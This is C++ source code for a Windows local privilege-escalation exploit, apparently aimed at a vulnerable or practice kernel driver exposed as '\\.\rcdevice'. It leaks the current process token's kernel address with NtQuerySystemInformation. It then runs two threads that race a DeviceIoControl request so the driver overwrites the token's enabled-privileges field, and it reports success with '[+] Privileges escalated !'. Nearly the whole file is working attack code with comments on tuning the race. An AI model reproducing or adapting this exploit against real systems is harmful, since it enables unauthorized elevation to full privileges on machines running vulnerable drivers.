#include "stdafx.h"
#include "structs.h"
BYTE* TokenObject;
typedef NTSTATUS (NTAPI *_NtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );
DWORD WINAPI RaceThread02(LPVOID lpParam)
{
	Ustruct* u = *(Ustruct **) lpParam;
	int* oldaddr = u->UserAddress;
	while ( true )
	{
		u->UserAddress = (int*)(TokenObject);
		for(int i=0;i<666;i++); // to increase our chances a bit
		u->UserAddress = oldaddr;
	}
	return 0;
}
DWORD WINAPI RaceThread01(LPVOID Params)
{
	HANDLE hthread;
	DWORD ThreadId;
	int* userint = new int;
	UserStruct* userstruct = new UserStruct;
	Ustruct* ustruct = new Ustruct;

	userstruct->field1 = 0x1586;
	userstruct->field3 = 0x1844;
	/*
	field4 = 0xFFFF9643, so that the calculation results in 0xFFFFFFFF.
	*/
	userstruct->field4 = 0xFFFF9643;
	userstruct->ustruct = ustruct;
	userstruct->ustruct->UserAddress = userint;

	hthread = CreateThread(NULL,0,RaceThread02,&userstruct->ustruct,0,&ThreadId);
	while ( true )
	{
		DWORD Bytesr;
		userstruct->ustruct->UserAddress = userint;
		*userint = 0;
		if ( DeviceIoControl(*(HANDLE*)Params,0x22e054,userstruct,sizeof(UserStruct),NULL,NULL,&Bytesr,NULL) )
		{
			if ( *userint == 0 )
			{
				/*
				userint value didn't change. This means that
				the kernel driver enabled the privileges.
				*/
				break; 
			}
		}
	}
	TerminateThread(hthread,0);
	delete userstruct;
	delete ustruct;
	delete userint;
	return 0;
}
int _tmain(int argc, _TCHAR* argv[])
{
	HANDLE hdevice,hthread;
	DWORD ThreadId;
	hdevice = CreateFile(L"\\\\.\\rcdevice",
		GENERIC_READ|GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
		);
	/*Open a handle to the process token*/
	HANDLE hToken;
	if ( OpenProcessToken(GetCurrentProcess(),TOKEN_ALL_ACCESS,&hToken) )
	{
		_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
		SYSTEM_HANDLE_INFORMATION* SysHInfo = (SYSTEM_HANDLE_INFORMATION*) malloc(2048);
		ULONG ReturnLength;
		NTSTATUS status;
		if ( (status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation,
			SysHInfo,2048,
			&ReturnLength)) == STATUS_INFO_LENGTH_MISMATCH )
		{
			free(SysHInfo);
			SysHInfo = (SYSTEM_HANDLE_INFORMATION*) malloc(ReturnLength);
			status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation,SysHInfo,ReturnLength,NULL);
		}
		if ( ! NT_SUCCESS(status) )
		{
			cout << "NtQuerySystemInformation Failed !" << endl;
			_getch();
			return 0;
		}
		/*Search for the address of the opened token's object*/
		unsigned int i;
		for ( i = 0 ; i < SysHInfo->HandleCount ; ++i )
		{
			SYSTEM_HANDLE handle = SysHInfo->Handles[i];
			if ( GetCurrentProcessId() == handle.ProcessId && hToken == (HANDLE) handle.Handle )
			{
				TokenObject = (BYTE*)(handle.Object);
				printf("Token object at : %p\n",TokenObject);
				/* Enabled field */
				TokenObject += 0x48;
				break;
			}
		}	
		if ( TokenObject == 0 )
		{
			cout << "Failed to get the token object" << endl;
			_getch();
			return 0;
		}
		hthread = CreateThread(NULL,0,RaceThread01,&hdevice,0,&ThreadId);
		WaitForSingleObject(hthread,INFINITE);
		cout << "[+] Privileges escalated !" << endl;
	}
	_getch();
	return 0;
}

